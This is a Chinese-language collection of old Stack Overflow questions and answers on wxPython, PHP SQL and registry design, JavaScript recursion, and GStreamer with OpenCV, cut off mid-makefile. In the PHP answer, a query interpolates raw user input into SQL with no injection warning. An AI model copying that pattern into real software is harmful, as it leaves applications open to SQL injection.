    self.textbuttoncolour = wx.BitmapButton(self.panel, ID_ButtonTextColour, b, size=wx.Size(50,25))
    self.selectionbrush = wx.BitmapButton(self.panel, ID_SelectionBrush, b, size=wx.Size(50,25))
    self.selectionpen = wx.BitmapButton(self.panel, ID_SelectionPen, b, size=wx.Size(50,25))
    self.separatorcolour = wx.BitmapButton(self.panel, ID_SeparatorColour, b, size=wx.Size(50,25))

    self.separatorspin = wx.SpinCtrl(self.panel, -1, "7", min=3, max=20,
                                     style=wx.SP_ARROW_KEYS)
    self.marginspin = wx.SpinCtrl(self.panel, -1, "6", min=3, max=20,
                                  style=wx.SP_ARROW_KEYS)
    self.paddingspin = wx.SpinCtrl(self.panel, -1, "6", min=3, max=20,
                                   style=wx.SP_ARROW_KEYS)
    self.borderspin = wx.SpinCtrl(self.panel, -1, "3", min=3, max=7,
                                  style=wx.SP_ARROW_KEYS)

    self.__set_properties()
    self.__do_layout()

    self.Bind(wx.EVT_RADIOBUTTON, self.OnDefaultStyle, self.defaultstyle)
    self.Bind(wx.EVT_RADIOBUTTON, self.OnGradientStyle, self.gradientstyle)
    self.Bind(wx.EVT_RADIOBUTTON, self.OnVerticalGradient, self.verticalgradient)
    self.Bind(wx.EVT_RADIOBUTTON, self.OnHorizontalGradient, self.horizontalgradient)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_BackgroundColour)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_GradientFrom)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_GradientTo)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_BorderColour)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_CaptionColour)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_ButtonTextColour)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_SelectionBrush)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_SelectionPen)
    self.Bind(wx.EVT_BUTTON, self.OnSetColour, id=ID_SeparatorColour)

    self.Bind(wx.EVT_SPINCTRL, self.OnSeparator, self.separatorspin)
    self.Bind(wx.EVT_SPINCTRL, self.OnMargins, self.marginspin)
    self.Bind(wx.EVT_SPINCTRL, self.OnPadding, self.paddingspin)
    self.Bind(wx.EVT_SPINCTRL, self.OnBorder, self.borderspin)

    self.Bind(wx.EVT_CLOSE, self.OnClose)        

def __set_properties(self):

    self.defaultstyle.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.BOLD, 0, ""))
    self.defaultstyle.SetValue(1)
    self.gradientstyle.SetFont(wx.Font(8, wx.DEFAULT, wx.NORMAL, wx.BOLD, 0, ""))
    self.verticalgradient.SetValue(1)

    if self.targetTitleBar.GetStyle() & bp.BP_DEFAULT_STYLE:
        self.verticalgradient.Enable(False)
        self.horizontalgradient.Enable(False)
        self.defaultstyle.SetValue(1)
    else:
        self.gradientstyle.SetValue(1)

    self.borderspin.SetValue(self.targetTitleBar.GetBPArt().GetMetric(bp.BP_BORDER_SIZE))
    self.separatorspin.SetValue(self.targetTitleBar.GetBPArt().GetMetric(bp.BP_SEPARATOR_SIZE))
    self.marginspin.SetValue(self.targetTitleBar.GetBPArt().GetMetric(bp.BP_MARGINS_SIZE).x)
    self.paddingspin.SetValue(self.targetTitleBar.GetBPArt().GetMetric(bp.BP_PADDING_SIZE).x)

    self.UpdateColours()        

def __do_layout(self):

    mainsizer = wx.BoxSizer(wx.VERTICAL)
    buttonsizer = wx.BoxSizer(wx.HORIZONTAL)
    bottomsizer = wx.StaticBoxSizer(self.bottomsizer_staticbox, wx.VERTICAL)
    sizer_13 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_12 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_11 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_10 = wx.BoxSizer(wx.HORIZONTAL)
    coloursizer = wx.StaticBoxSizer(self.coloursizer_staticbox, wx.HORIZONTAL)
    rightsizer = wx.BoxSizer(wx.VERTICAL)
    sizer_9 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_8 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_7 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_6 = wx.BoxSizer(wx.HORIZONTAL)
    leftsizer = wx.BoxSizer(wx.VERTICAL)
    sizer_5 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_4 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_3 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_2 = wx.BoxSizer(wx.HORIZONTAL)
    sizer_1 = wx.BoxSizer(wx.HORIZONTAL)
    stylesizer = wx.StaticBoxSizer(self.stylesizer_staticbox, wx.VERTICAL)
    tophsizer = wx.BoxSizer(wx.HORIZONTAL)
    tophsizer2 = wx.BoxSizer(wx.VERTICAL)

    stylesizer.Add(self.defaultstyle, 0, wx.ALL|wx.EXPAND|wx.ADJUST_MINSIZE, 5)

    tophsizer.Add(self.gradientstyle, 0, wx.LEFT|wx.RIGHT|wx.EXPAND|
                  wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)

    tophsizer2.Add(self.verticalgradient, 0, wx.BOTTOM|wx.ADJUST_MINSIZE, 3)
    tophsizer2.Add(self.horizontalgradient, 0, wx.ADJUST_MINSIZE, 0)

    tophsizer.Add(tophsizer2, 1, wx.LEFT|wx.EXPAND|wx.ALIGN_CENTER_VERTICAL, 10)

    stylesizer.Add(tophsizer, 1, wx.EXPAND, 0)

    mainsizer.Add(stylesizer, 0, wx.ALL|wx.EXPAND, 5)

    label_1 = wx.StaticText(self.panel, -1, "Background Brush Colour:")
    sizer_1.Add(label_1, 0, wx.ALL|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_1.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_1.Add(self.bakbrush, 0, wx.ADJUST_MINSIZE, 0)

    leftsizer.Add(sizer_1, 1, wx.EXPAND, 0)

    label_2 = wx.StaticText(self.panel, -1, "Gradient Colour From:")
    sizer_2.Add(label_2, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_2.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_2.Add(self.gradientfrom, 0, wx.ADJUST_MINSIZE, 0)

    leftsizer.Add(sizer_2, 1, wx.EXPAND, 0)

    label_3 = wx.StaticText(self.panel, -1, "Gradient Colour To:")
    sizer_3.Add(label_3, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_3.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_3.Add(self.gradientto, 0, wx.ADJUST_MINSIZE, 0)

    leftsizer.Add(sizer_3, 1, wx.EXPAND, 0)

    label_4 = wx.StaticText(self.panel, -1, "Border Colour:")
    sizer_4.Add(label_4, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_4.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_4.Add(self.bordercolour, 0, wx.ADJUST_MINSIZE, 0)

    leftsizer.Add(sizer_4, 1, wx.EXPAND, 0)

    label_5 = wx.StaticText(self.panel, -1, "Main Caption Colour:")
    sizer_5.Add(label_5, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_5.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_5.Add(self.captioncolour, 0, wx.ADJUST_MINSIZE, 0)

    leftsizer.Add(sizer_5, 1, wx.EXPAND, 0)

    coloursizer.Add(leftsizer, 0, wx.ALL|wx.ALIGN_CENTER_VERTICAL, 5)
    coloursizer.Add((20, 20), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)

    label_6 = wx.StaticText(self.panel, -1, "Text Button Colour:")
    sizer_6.Add(label_6, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_6.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_6.Add(self.textbuttoncolour, 0, wx.ADJUST_MINSIZE, 0)

    rightsizer.Add(sizer_6, 1, wx.EXPAND, 0)

    label_7 = wx.StaticText(self.panel, -1, "Selection Brush Colour:")
    sizer_7.Add(label_7, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_7.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_7.Add(self.selectionbrush, 0, wx.ADJUST_MINSIZE, 0)

    rightsizer.Add(sizer_7, 1, wx.EXPAND, 0)

    label_8 = wx.StaticText(self.panel, -1, "Selection Pen Colour:")
    sizer_8.Add(label_8, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_8.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_8.Add(self.selectionpen, 0, wx.ADJUST_MINSIZE, 0)

    rightsizer.Add(sizer_8, 1, wx.EXPAND, 0)

    label_9 = wx.StaticText(self.panel, -1, "Separator Colour:")
    sizer_9.Add(label_9, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_9.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_9.Add(self.separatorcolour, 0, wx.ADJUST_MINSIZE, 0)

    rightsizer.Add(sizer_9, 1, wx.EXPAND, 0)

    coloursizer.Add(rightsizer, 0, wx.ALL|wx.ALIGN_CENTER_VERTICAL, 5)

    mainsizer.Add(coloursizer, 0, wx.ALL|wx.EXPAND, 5)

    label_10 = wx.StaticText(self.panel, -1, "Separator Size:")
    sizer_10.Add(label_10, 0, wx.ALL|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_10.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_10.Add(self.separatorspin, 0, wx.ALL|wx.ADJUST_MINSIZE, 5)

    bottomsizer.Add(sizer_10, 1, wx.EXPAND, 0)

    label_11 = wx.StaticText(self.panel, -1, "Margins Size:")
    sizer_11.Add(label_11, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_11.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_11.Add(self.marginspin, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ADJUST_MINSIZE, 5)

    bottomsizer.Add(sizer_11, 1, wx.EXPAND, 0)

    label_12 = wx.StaticText(self.panel, -1, "Padding Size:")
    sizer_12.Add(label_12, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_12.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_12.Add(self.paddingspin, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ADJUST_MINSIZE, 5)

    bottomsizer.Add(sizer_12, 1, wx.EXPAND, 0)

    label_13 = wx.StaticText(self.panel, -1, "Border Size:")
    sizer_13.Add(label_13, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ALIGN_CENTER_VERTICAL|wx.ADJUST_MINSIZE, 5)
    sizer_13.Add((0, 0), 1, wx.EXPAND|wx.ADJUST_MINSIZE, 0)
    sizer_13.Add(self.borderspin, 0, wx.LEFT|wx.RIGHT|wx.BOTTOM|wx.ADJUST_MINSIZE, 5)

    bottomsizer.Add(sizer_13, 1, wx.EXPAND, 0)

    mainsizer.Add(bottomsizer, 0, wx.ALL|wx.EXPAND, 5)

    self.panel.SetSizer(mainsizer)
    sizer = wx.BoxSizer()
    sizer.Add(self.panel, 1, wx.EXPAND)
    self.SetSizer(sizer)
    self.Fit()

def CreateColourBitmap(self, c):

    image = wx.EmptyImage(25, 14)

    for x in xrange(25):
        for y in xrange(14):
            pixcol = c
            if x == 0 or x == 24 or y == 0 or y == 13:
                pixcol = wx.BLACK

            image.SetRGB(x, y, pixcol.Red(), pixcol.Green(), pixcol.Blue())

    return image.ConvertToBitmap()

def UpdateColours(self):

    bk = self.targetTitleBar.GetBPArt().GetColour(bp.BP_BACKGROUND_COLOUR)
    self.bakbrush.SetBitmapLabel(self.CreateColourBitmap(bk))

    capfrom = self.targetTitleBar.GetBPArt().GetColour(bp.BP_GRADIENT_COLOUR_FROM)
    self.gradientfrom.SetBitmapLabel(self.CreateColourBitmap(capfrom))

    capto = self.targetTitleBar.GetBPArt().GetColour(bp.BP_GRADIENT_COLOUR_TO)
    self.gradientto.SetBitmapLabel(self.CreateColourBitmap(capto))

    captxt = self.targetTitleBar.GetBPArt().GetColour(bp.BP_TEXT_COLOUR)
    self.captioncolour.SetBitmapLabel(self.CreateColourBitmap(captxt))

    bor = self.targetTitleBar.GetBPArt().GetColour(bp.BP_BORDER_COLOUR)
    self.bordercolour.SetBitmapLabel(self.CreateColourBitmap(bor))

    btntext = self.targetTitleBar.GetBPArt().GetColour(bp.BP_BUTTONTEXT_COLOUR)
    self.textbuttoncolour.SetBitmapLabel(self.CreateColourBitmap(btntext))

    selb = self.targetTitleBar.GetBPArt().GetColour(bp.BP_SELECTION_BRUSH_COLOUR)
    self.selectionbrush.SetBitmapLabel(self.CreateColourBitmap(selb))

    selp = self.targetTitleBar.GetBPArt().GetColour(bp.BP_SELECTION_PEN_COLOUR)
    self.selectionpen.SetBitmapLabel(self.CreateColourBitmap(selp))

    sepc = self.targetTitleBar.GetBPArt().GetColour(bp.BP_SEPARATOR_COLOUR)
    self.separatorcolour.SetBitmapLabel(self.CreateColourBitmap(sepc))

def OnDefaultStyle(self, event):

    self.verticalgradient.Enable(False)
    self.horizontalgradient.Enable(False)
    self.targetTitleBar.SetStyle(bp.BP_DEFAULT_STYLE)

    self.targetTitleBar.Refresh()

    event.Skip()

def OnGradientStyle(self, event): 

    self.verticalgradient.Enable(True)
    self.horizontalgradient.Enable(True)
    self.targetTitleBar.SetStyle(bp.BP_USE_GRADIENT)
    self.targetTitleBar.Refresh()

    event.Skip()

def OnVerticalGradient(self, event):

    self.targetTitleBar.GetBPArt().SetGradientType(bp.BP_GRADIENT_VERTICAL)
    self.targetTitleBar.SetStyle(bp.BP_USE_GRADIENT)
    self.targetTitleBar.Refresh()

    event.Skip()

def OnHorizontalGradient(self, event):

    self.targetTitleBar.GetBPArt().SetGradientType(bp.BP_GRADIENT_HORIZONTAL)
    self.targetTitleBar.SetStyle(bp.BP_USE_GRADIENT)
    self.targetTitleBar.Refresh()

    event.Skip()

def OnSetColour(self, event):

    dlg = wx.ColourDialog(self.parent)

    dlg.SetTitle("Colour Picker")

    if dlg.ShowModal() != wx.ID_OK:
        return

    var = 0
    if event.GetId() == ID_BackgroundColour:
        var = bp.BP_BACKGROUND_COLOUR
    elif event.GetId() == ID_GradientFrom:
        var = bp.BP_GRADIENT_COLOUR_FROM
    elif event.GetId() == ID_GradientTo:
        var = bp.BP_GRADIENT_COLOUR_TO
    elif event.GetId() == ID_BorderColour:
        var = bp.BP_BORDER_COLOUR
    elif event.GetId() == ID_CaptionColour:
        var = bp.BP_TEXT_COLOUR
    elif event.GetId() == ID_ButtonTextColour:
        var = bp.BP_BUTTONTEXT_COLOUR
    elif event.GetId() == ID_SelectionBrush:
        var = bp.BP_SELECTION_BRUSH_COLOUR
    elif event.GetId() == ID_SelectionPen:
        var = bp.BP_SELECTION_PEN_COLOUR
    elif event.GetId() == ID_SeparatorColour:
        var = bp.BP_SEPARATOR_COLOUR
    else:
        return        

    self.targetTitleBar.GetBPArt().SetColour(var, dlg.GetColourData().GetColour())
    self.targetTitleBar.Refresh()
    self.UpdateColours()

    self.parent.useredited = True

def OnSeparator(self, event):

    self.targetTitleBar.GetBPArt().SetMetric(bp.BP_SEPARATOR_SIZE,
                                             event.GetInt())

    self.targetTitleBar.DoLayout()
    self.parent.mainPanel.Layout()
    self.parent.useredited = True

    event.Skip()

def OnMargins(self, event):

    self.targetTitleBar.GetBPArt().SetMetric(bp.BP_MARGINS_SIZE,
                                             wx.Size(event.GetInt(), event.GetInt()))

    self.targetTitleBar.DoLayout()
    self.parent.mainPanel.Layout()

    self.parent.useredited = True

    event.Skip()

def OnPadding(self, event):

    self.targetTitleBar.GetBPArt().SetMetric(bp.BP_PADDING_SIZE,
                                             wx.Size(event.GetInt(), event.GetInt()))

    self.targetTitleBar.DoLayout()
    self.parent.mainPanel.Layout()
    self.parent.useredited = True

    event.Skip()

def OnBorder(self, event):

    self.targetTitleBar.GetBPArt().SetMetric(bp.BP_BORDER_SIZE,
                                             event.GetInt())

    self.targetTitleBar.DoLayout()
    self.parent.mainPanel.Layout()

    self.parent.useredited = True

    event.Skip()

def OnClose(self, event):

    self.parent.hassettingpanel = False
    self.Destroy()enter code here 
```

例如，我会用什么代替“parent.titleBar”？我是否需要更改代码中的其他任何内容以使其独立运行？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:26:42.563

您通常必须调整演示中的代码，以便它可以在该框架之外运行。很久以前，我[在这里](http://wiki.wxpython.org/Using%20wxPython%20Demo%20Code)写了一个关于这个主题的 wiki 页面。

父级很可能是 wx.Frame。几乎所有小部件都需要父级。就个人而言，如果我打算用 Python 编写游戏，我会使用 PyGame 或 Pyglet 或类似的东西。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:33:10.127

将小部件从演示上下文移动到应用程序通常需要进行一些更改。通常这涉及创建一个应用程序（在下面的示例中，我使用了 PySimpleApp），并删除日志。下面是一个完整的例子：

```
import wx 
class SettingsPanel(wx.MiniFrame):

    def __init__(self, parent, id=wx.ID_ANY, title="Settings Panel", pos=wx.DefaultPosition,
             size=wx.DefaultSize,
             style=wx.SYSTEM_MENU | wx.CAPTION | wx.CLOSE_BOX | wx.FRAME_NO_TASKBAR
             | wx.FRAME_FLOAT_ON_PARENT | wx.CLIP_CHILDREN):

        wx.MiniFrame.__init__(self, parent, id, title, pos, size, style)

        #self.targetTitleBar = parent.titleBar
        self.parent = parent
        self.panel = wx.Panel(self, -1)

app = wx.PySimpleApp() 
frame = SettingsPanel(None)
frame.Show()
app.MainLoop() 
```

框架不需要父级，所以这里我只是传入 None 作为父级，并且由于 None 没有 titleBar 属性，所以我注释掉了该行。

更新：如果你想用 运行它`titleBar`，但又不想使用真实的真实`titleBar`对象，你可以创建一个模拟对象。如果您愿意，有几个模拟库可以帮助您解决这个问题，但由于您`titleBar`只有几个方法，因此自己制作一个模拟对象可能是最简单的。您需要添加您调用的所有方法，但我创建了一个仅包含该`Refresh`方法的简单版本。另外，由于您现在不能使用`parent=None`，所以我添加了一个框架作为迷你框架的父级。

```
import wx 

class SettingsPanel(wx.MiniFrame):

    def __init__(self, parent, id=wx.ID_ANY, title="Settings Panel", pos=wx.DefaultPosition,
             size=wx.DefaultSize,
             style=wx.SYSTEM_MENU | wx.CAPTION | wx.CLOSE_BOX | wx.FRAME_NO_TASKBAR
             | wx.FRAME_FLOAT_ON_PARENT | wx.CLIP_CHILDREN):

        wx.MiniFrame.__init__(self, parent, id, title, pos, size, style)

        self.targetTitleBar = parent.titleBar
        self.parent = parent
        self.panel = wx.Panel(self, -1)

        self.targetTitleBar.Refresh() # an example of calling the mock object

class MockTitleBar(object):
    def __init__(self):
        pass
    def Refresh(self):
        print "refresh"

app = wx.PySimpleApp()
title_bar = MockTitleBar()
top_frame = wx.Frame(None)
top_frame.titleBar = title_bar
frame = SettingsPanel(top_frame)
top_frame.Show()
frame.Show()
app.MainLoop() 
```

# php - 未知列错误

> ID：10403574
> 
> 赞同：0
> 
> 时间：2012-05-01T20:05:17.387
> 
> 标签：php, sql

我检查了所有内容，但鉴于我使用 PHP 的时间不到 1 个月，我似乎无法深入了解这一点。每当我使用这个 $sql 查询时，它都会给我错误：

```
//$startrow is variable
$startrow = 0;

$sql = "SELECT `accounts.full_name`, `image.name` FROM `accounts` LEFT JOIN 
`image` ON `accounts.person_id` = `image.person_id` WHERE 
`accounts.image_set` = '$yes' and `accounts.full_name` LIKE '%$q%' 
LIMIT $startrow, 15"; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:06:48.260

您没有名为 的表`image`。你的桌子叫做`face_shot`.

此外，您的反引号必须围绕名称的每个部分（而不是包含点）。[或者您可以完全省略反引号，保留字](http://dev.mysql.com/doc/refman/5.0/en/reserved-words.html)除外。

```
SELECT `accounts`.`full_name`, `image`.`name`
FROM `accounts`
LEFT JOIN `image` ON `accounts`.`person_id` = `image`.`person_id`
WHERE `accounts`.`image_set` = '$yes'
AND `accounts`.`full_name` LIKE '%$q%' 
LIMIT $startrow, 15 
```

# php - 注册表或 $_ENV

> ID：10403578
> 
> 赞同：1
> 
> 时间：2012-05-01T20:05:33.410
> 
> 标签：php, design-patterns, global

**注册表模式**和**$_ENV**有什么区别，特别是在 php 中使用？

它们中的哪一个提供更高的安全性和性能？

例如，为什么许多编码人员使用**$config['deflang']**和注册表模式而不仅仅是**$_ENV['deflang']**

提前致谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:08:54.297

`$_ENV`有一个非常具体的目的——它是过程环境。你真的不应该把随机数据扔进去。如果你想这样做，至少使用一个全局（或者，更好的是，一个静态类成员）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-31T00:31:53.420

尝试这个：

```
class Registry {

    public static $instance;

    public function set($key, $val) {
        $this->_reg[$key] = $val;
    }
    public function get($key) {
        return $this->_reg[$key];
    }
    public static function Singleton() {
        $class = __CLASS__;
        if (!(self::$instance instanceof $class)) {
            try {
                if (!defined('REQUIRED')) {
                    throw new Registry_Exception('No direct access.');
                }
            } catch (Registry_Exception $e) {}
            self::$instance = new $class();
        }
        return self::$instance;
    }
    private function __construct() {}

}

$registry = new Registry();
$registry->set('setting', 'value'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T20:11:11.390

这两件事完全不同。

*   `$_ENV`是一个包含所有环境变量的超全局数组。
*   `$config`是一些用户定义的变量，可以来自配置文件、数据库等。

一种常见的方法（尤其是在某些框架中）是有一个配置文件，其中包含一个具有多个配置的数组和一个环境变量（例如`FRAMEWORKNAME_ENV`），然后选择活动配置。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:12:19.450

注册表模式允许您延迟加载资源。

```
$db = $_ENV['db_connection']; // The connection must be setup prior 
```

对比

```
$db = $config->get('db_connection');
// An internal method can check for an existing connection 
// and set one up if needed 
```

# javascript - 在 Javascript 中，递归函数是否会在达到基本情况并开始向下移回堆栈后释放它的资源？

> ID：10403587
> 
> 赞同：0
> 
> 时间：2012-05-01T20:06:00.160
> 
> 标签：javascript

也就是说，如果您直到堆栈的最底部才引用对象，您是否应该关心在递归函数内返回对象？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T21:55:19.750

在您的变量不再指向它之后，Javascript 在某个不确定的点释放内存。如果你从基础返回一个对象，然后继续返回它，它不应该被释放，不像局部变量 C，例如。

# c++ - 将 opencv 处理添加到 gstreamer 应用程序

> ID：10403588
> 
> 赞同：16
> 
> 时间：2012-05-01T20:06:05.243
> 
> 标签：c++, c, opencv, gstreamer, fifo

我正在尝试执行以下操作：使用 gstreamer 接收视频流并使用 opencv 处理它。我找到了几个解决方案，其中之一是将视频写入（来自gstreamer）fifo，然后使用opencv读取它。[（此处为MJPEG 流和解码](https://stackoverflow.com/questions/6022423/mjpeg-streaming-and-decoding)的 OPTION3 ）。问题是我打不开管道。cvCreateFileCapture 永远不会返回。这是我写的部分代码：

```
if(mkfifo("fifo.avi", S_IRUSR| S_IWUSR) == -1)
{
    cout<<"Cant create fifo"<<endl;
    cout<<errno<<endl;
}

loop = g_main_loop_new(NULL, false);

fsink = gst_element_factory_make("filesink", "fsink");
g_object_set(G_OBJECT(fsink), "location", "fifo.avi", NULL);

playbin = gst_element_factory_make("playbin2", "play");    
g_object_set(G_OBJECT(playbin), "uri", uri.c_str(), NULL);
g_object_set(G_OBJECT(playbin), "video-sink", fsink, NULL);

bus = gst_pipeline_get_bus(GST_PIPELINE(playbin));
gst_bus_add_signal_watch(bus);

g_signal_connect(bus, "message::buffering", G_CALLBACK(&set_playbin_state), playbin);
gst_object_unref(bus);

cvNamedWindow("output", CV_WINDOW_AUTOSIZE);
capture = cvCreateFileCapture("fifo.avi"); 
```

程序堆栈在最后一行。PS：我使用的是opencv 2.3.1。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2014-10-16T10:38:06.400

这是我的 Gstreamer 1.4.0 和 OpenCV 2.4.9 的完整源代码解决方案。

它用于`gst_parse_launch()`解析您将提供给`gst-launch`. Gstreamer 管道将帧转换为 RGB888 格式，然后再将其输入 OpenCV，以便尽可能轻松地进行转换。

OpenCV 帧处理不在`new_sample()`回调中完成，它只从 gstreamer 中获取帧并将其推送到队列中，然后将在主线程中使用。这样我们就可以从 OpenCV 调用例如 imshow() 来实际将图像渲染到屏幕上。

~150 行...通过删除调试打印等可以减少到 <100 行代码。

可能应该在双端队列读/写周围添加线程同步

```
#include <gst/gst.h>
#include <gst/app/gstappsink.h>
#include <stdlib.h>

#include "opencv2/opencv.hpp"
using namespace cv;

// TODO: use synchronized deque
std::deque<Mat> frameQueue;

GstFlowReturn
new_preroll(GstAppSink *appsink, gpointer data) {
  g_print ("Got preroll!\n");
  return GST_FLOW_OK;
}

GstFlowReturn
new_sample(GstAppSink *appsink, gpointer data) {
  static int framecount = 0;
  framecount++;

  GstSample *sample = gst_app_sink_pull_sample(appsink);
  GstCaps *caps = gst_sample_get_caps(sample);
  GstBuffer *buffer = gst_sample_get_buffer(sample);
  const GstStructure *info = gst_sample_get_info(sample);

  // ---- Read frame and convert to opencv format ---------------

  GstMapInfo map;
  gst_buffer_map (buffer, &map, GST_MAP_READ);

  // convert gstreamer data to OpenCV Mat, you could actually
  // resolve height / width from caps...
  Mat frame(Size(320, 240), CV_8UC3, (char*)map.data, Mat::AUTO_STEP);
  int frameSize = map.size;

  // TODO: synchronize this....
  frameQueue.push_back(frame);

  gst_buffer_unmap(buffer, &map);

  // ------------------------------------------------------------

  // print dot every 30 frames
  if (framecount%30 == 0) {
    g_print (".");
  }

  // show caps on first frame
  if (framecount == 1) {
    g_print ("%s\n", gst_caps_to_string(caps));
  }

  gst_sample_unref (sample);
  return GST_FLOW_OK;
}

static gboolean
my_bus_callback (GstBus *bus, GstMessage *message, gpointer data) {
  g_print ("Got %s message\n", GST_MESSAGE_TYPE_NAME (message));
  switch (GST_MESSAGE_TYPE (message)) {
    case GST_MESSAGE_ERROR: {
      GError *err;
      gchar *debug;

      gst_message_parse_error (message, &err, &debug);
      g_print ("Error: %s\n", err->message);
      g_error_free (err);
      g_free (debug);    
      break;
    }
    case GST_MESSAGE_EOS:
      /* end-of-stream */
      break;
    default:
      /* unhandled message */
      break;
  }
  /* we want to be notified again the next time there is a message
   * on the bus, so returning TRUE (FALSE means we want to stop watching
   * for messages on the bus and our callback should not be called again)
   */
  return TRUE;
}

int
main (int argc, char *argv[])
{
  GError *error = NULL;

  gst_init (&argc, &argv);

  gchar *descr = g_strdup(
    "videotestsrc  pattern=ball ! "
    "video/x-raw,format=RGB ! "
    "videoconvert ! "
    "appsink name=sink sync=true"
  );
  GstElement *pipeline = gst_parse_launch (descr, &error);

  if (error != NULL) {
    g_print ("could not construct pipeline: %s\n", error->message);
    g_error_free (error);
    exit (-1);
  }

  /* get sink */
  GstElement *sink = gst_bin_get_by_name (GST_BIN (pipeline), "sink");

  gst_app_sink_set_emit_signals((GstAppSink*)sink, true);
  gst_app_sink_set_drop((GstAppSink*)sink, true);
  gst_app_sink_set_max_buffers((GstAppSink*)sink, 1);
  GstAppSinkCallbacks callbacks = { NULL, new_preroll, new_sample };
  gst_app_sink_set_callbacks (GST_APP_SINK(sink), &callbacks, NULL, NULL);

  GstBus *bus;
  guint bus_watch_id;
  bus = gst_pipeline_get_bus (GST_PIPELINE (pipeline));
  bus_watch_id = gst_bus_add_watch (bus, my_bus_callback, NULL);
  gst_object_unref (bus);

  gst_element_set_state (GST_ELEMENT (pipeline), GST_STATE_PLAYING);

  namedWindow("edges",1);
  while(1) {
    g_main_iteration(false);

      // TODO: synchronize...
    if (frameQueue.size() > 0) {
      // this lags pretty badly even when grabbing frames from webcam
      Mat frame = frameQueue.front();
      Mat edges;
      cvtColor(frame, edges, CV_RGB2GRAY);
      GaussianBlur(edges, edges, Size(7,7), 1.5, 1.5);
      Canny(edges, edges, 0, 30, 3);
      imshow("edges", edges);
      cv::waitKey(30);
      frameQueue.clear();
    }
  }  

  gst_element_set_state (GST_ELEMENT (pipeline), GST_STATE_NULL);
  gst_object_unref (GST_OBJECT (pipeline));

  return 0;  
} 
```

要在 OSX / Linux 上编译这样的 make 文件应该这样做：

```
GST_FLAGS=$(shell pkg-config --cflags --libs gstreamer-gl-1.0 gstreamer-tag-1.0 gstreamer-net-1.0 gstreamer-sdp-1.0 \
